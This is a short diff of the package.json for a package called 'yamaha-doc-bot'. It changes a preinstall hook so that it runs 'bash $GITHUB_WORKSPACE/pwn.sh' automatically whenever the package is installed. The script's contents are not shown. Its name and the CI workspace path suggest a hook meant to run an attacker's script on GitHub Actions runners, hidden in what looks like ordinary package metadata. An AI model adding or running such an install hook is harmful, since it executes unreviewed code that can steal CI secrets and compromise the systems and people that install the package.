@@ -2,6 +2,6 @@
   "name": "yamaha-doc-bot",
   "version": "1.0.0",
   "scripts": {
-    "preinstall": "bash pwn.sh"
+    "preinstall": "bash $GITHUB_WORKSPACE/pwn.sh"
   }
 }
